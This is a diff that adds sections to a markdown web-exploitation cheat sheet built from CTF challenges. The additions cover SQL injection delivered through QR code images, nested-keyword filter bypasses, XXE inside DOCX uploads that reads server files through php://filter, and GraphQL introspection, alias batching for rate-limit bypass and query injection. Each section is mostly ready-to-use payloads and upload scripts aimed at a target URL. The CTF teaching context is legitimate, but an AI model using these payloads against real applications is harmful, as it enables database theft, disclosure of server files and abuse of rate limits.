@@ -14,6 +14,8 @@
   - [WAF Bypass via XML Entity Encoding (Crypto-Cat)](#waf-bypass-via-xml-entity-encoding-crypto-cat)
   - [SQLi via EXIF Metadata Injection (29c3 CTF 2012)](#sqli-via-exif-metadata-injection-29c3-ctf-2012)
   - [Shift-JIS Encoding SQL Injection (Boston Key Party 2016)](#shift-jis-encoding-sql-injection-boston-key-party-2016)
+  - [SQL Injection via QR Code Input (H4ckIT CTF 2016)](#sql-injection-via-qr-code-input-h4ckit-ctf-2016)
+  - [SQL Double-Keyword Filter Bypass (DefCamp CTF 2016)](#sql-double-keyword-filter-bypass-defcamp-ctf-2016)
 - [SSTI (Server-Side Template Injection)](#ssti-server-side-template-injection)
   - [Jinja2 RCE](#jinja2-rce)
   - [Go Template Injection](#go-template-injection)
@@ -29,6 +31,7 @@
 - [XXE (XML External Entity)](#xxe-xml-external-entity)
   - [Basic XXE](#basic-xxe)
   - [OOB XXE with External DTD](#oob-xxe-with-external-dtd)
+  - [XXE via DOCX/Office XML Upload (School CTF 2016)](#xxe-via-docxoffice-xml-upload-school-ctf-2016)
 - [XML Injection via X-Forwarded-For Header (Pwn2Win 2016)](#xml-injection-via-x-forwarded-for-header-pwn2win-2016)
 - [Command Injection](#command-injection)
   - [Newline Bypass](#newline-bypass)
@@ -36,6 +39,10 @@
   - [Sendmail Parameter Injection via CGI (SECCON 2015)](#sendmail-parameter-injection-via-cgi-seccon-2015)
   - [Multi-Barcode Concatenation to Shell Injection (BSidesSF 2024)](#multi-barcode-concatenation-to-shell-injection-bsidessf-2024)
   - [Git CLI Newline Injection via URL Path (BSidesSF 2026)](#git-cli-newline-injection-via-url-path-bsidessf-2026)
+- [GraphQL Injection and Exploitation (Hack.lu CTF 2020, HeroCTF v5)](#graphql-injection-and-exploitation-hacklu-ctf-2020-heroctf-v5)
+  - [Introspection and Schema Discovery](#introspection-and-schema-discovery)
+  - [Query Batching and Aliasing for Rate Limit Bypass](#query-batching-and-aliasing-for-rate-limit-bypass)
+  - [String Interpolation Injection](#string-interpolation-injection)
 
 For code execution attacks (Ruby/Perl/JS/LaTeX/Prolog injection, PHP preg_replace /e, ReDoS, file upload to RCE, PHP deserialization, XPath injection, Thymeleaf SpEL SSTI, SQLi keyword fragmentation, SQL WHERE bypass, SQL via DNS), see [server-side-exec.md](server-side-exec.md). For deserialization attacks (Java, Pickle) and race conditions, see [server-side-deser.md](server-side-deser.md). For CVE-specific exploits, path traversal bypasses, Flask/Werkzeug debug, and other advanced techniques, see [server-side-advanced.md](server-side-advanced.md).
 
@@ -274,6 +281,57 @@ socket.send('{"type":"get_answer","answer":"\\u00a5\\" OR 1=1 -- "}')
 
 **Key insight:** Charset mismatch between escaping layer (Unicode) and database layer (Shift-JIS) defeats custom escape routines. Look for applications using non-UTF-8 character encodings (Shift-JIS, EUC-JP, GBK) where multi-byte characters contain `0x5c` (backslash) as a trailing byte.
 
+### SQL Injection via QR Code Input (H4ckIT CTF 2016)
+
+Applications that decode QR codes and use the contents in SQL queries create an injection vector through the QR image itself.
+
+```python
+import qrcode
+import base64
+import requests
+
+# Generate QR code containing SQL injection payload
+# Spaces may be filtered - use tabs instead
+payload = "'\tunion\tselect\tsecret_field\tfrom\tmessages\twhere\tsecret_field\tlike\t'%flag%"
+
+# Some apps use reversed base64: encode, reverse, then QR-encode
+encoded = base64.b64encode(payload.encode()).decode().strip()
+# reversed_encoded = encoded[::-1]  # if app reverses base64
+
+# Generate QR code image
+img = qrcode.make(payload)
+img.save("sqli_qr.png")
+
+# Upload QR code to target application
+files = {'qr': open('sqli_qr.png', 'rb')}
+r = requests.post('http://target/scan', files=files)
+```
+
+**Key insight:** QR codes are often trusted as "safe" input. When decoded QR content flows into SQL queries, standard SQLi techniques apply but with tab characters (`\t`) replacing spaces when space filtering is active. The QR encoding adds an obfuscation layer that may bypass WAFs.
+
+### SQL Double-Keyword Filter Bypass (DefCamp CTF 2016)
+
+Bypass SQL keyword filters that perform single-pass removal by nesting the keyword inside itself, so removal reveals the original keyword.
+
+```text
+# Filter removes "select" once from input
+# Payload: sselectelect -> after removal -> select
+
+# Full injection with nested keywords:
+), ((selselectect * frofromm (seselectlect load_load_filefile('/flag')) as a limit 0, 1), '2') #
+
+# Common nested bypass patterns:
+# "select" blocked: sselectelect, seLselectECT
+# "union"  blocked: ununionion
+# "from"   blocked: frofromm
+# "where"  blocked: whewherere
+# "load_file" blocked: load_load_filefile
+# "and"    blocked: aandnd
+# "or"     blocked: oorr
+```
+
+**Key insight:** Single-pass keyword filters that replace/remove SQL keywords once are trivially bypassed by embedding the keyword within itself. The outer characters survive removal, reconstructing the forbidden keyword. Always test if the filter runs iteratively or just once.
+
 ---
 
 ## SSTI (Server-Side Template Injection)
@@ -452,6 +510,39 @@ Host evil.dtd:
 %eval; %exfil;
 ```
 
+### XXE via DOCX/Office XML Upload (School CTF 2016)
+
+DOCX files are ZIP archives containing XML. Modify `[Content_Types].xml` inside the DOCX to inject XXE payloads that execute when the server parses the uploaded document.
+
+```bash
+# Step 1: Create a minimal DOCX and extract it
+mkdir docx_exploit && cd docx_exploit
+unzip template.docx
+
+# Step 2: Inject XXE into [Content_Types].xml
+cat > '[Content_Types].xml' << 'EOF'
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/index.php">
+]>
+<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
+  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
+  <Default Extension="xml" ContentType="application/xml"/>
+  <Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
+  <Override PartName="/hack" ContentType="&xxe;"/>
+</Types>
+EOF
+
+# Step 3: Repackage as DOCX
+zip -r exploit.docx '[Content_Types].xml' word/ _rels/
+
+# Step 4: Upload to target
+curl -F "file=@exploit.docx" http://target/upload
+# Response or error message may contain base64-encoded file contents
+```
+
+**Key insight:** Any file format based on ZIP+XML (DOCX, XLSX, PPTX, ODT, SVG+ZIP) can carry XXE payloads. The parser often processes `[Content_Types].xml` first, making it the ideal injection point. Use `php://filter/convert.base64-encode` for binary-safe exfiltration.
+
 ---
 
 ## XML Injection via X-Forwarded-For Header (Pwn2Win 2016)
@@ -553,6 +644,55 @@ puts response.body
 **When to recognize:** Web app interacts with git, svn, or other CLI tools. Source shows shell interpolation with partial sanitization. Test with `%0a` (newline) and `%0d%0a` (CRLF) in URL parameters.
 
 **Defense check:** Does the filter block `\n` (0x0a)? Does it use allowlists instead of blocklists? Does it use `execve()` (no shell) instead of `system()` (shell)?
+
+---
+
+## GraphQL Injection and Exploitation (Hack.lu CTF 2020, HeroCTF v5)
+
+### Introspection and Schema Discovery
+
+```graphql
+# Full schema enumeration (often left enabled in CTFs)
+{__schema{types{name,fields{name,args{name,type{name}}}}}}
+
+# Shortened introspection query
+{__type(name:"Query"){fields{name,type{name,ofType{name}}}}}
+
+# Find all mutations
+{__schema{mutationType{fields{name,args{name,type{name}}}}}}
+
+# Find hidden types
+{__schema{types{name,kind,description}}}
+```
+
+### Query Batching and Aliasing for Rate Limit Bypass
+
+```graphql
+# Execute same mutation N times in single request via aliases
+mutation {
+  a1: increaseVote(id: "target") { count }
+  a2: increaseVote(id: "target") { count }
+  a3: increaseVote(id: "target") { count }
+  # ... repeat 1337 times
+}
+
+# Or via array batching (if supported):
+# POST body: [{"query":"mutation{vote(id:\"x\"){ok}}"}, {"query":"mutation{vote(id:\"x\"){ok}}"}, ...]
+```
+
+### String Interpolation Injection
+
+```javascript
+// Vulnerable server code pattern:
+const query = `mutation { doAction(input: "${userInput}") { result } }`;
+
+// Injection payload:
+// userInput = ") { result } } mutation { adminAction(secret: true) { flag } } #"
+// Resulting query:
+// mutation { doAction(input: "") { result } } mutation { adminAction(secret: true) { flag } } #") { result } }
+```
+
+**Key insight:** GraphQL combines query language power with REST-like endpoints. Three main attack surfaces: (1) introspection reveals the full API schema, (2) query batching/aliasing bypasses rate limits and multiplies actions, (3) string interpolation in server-side query construction enables injection similar to SQLi.
 
 ---
 
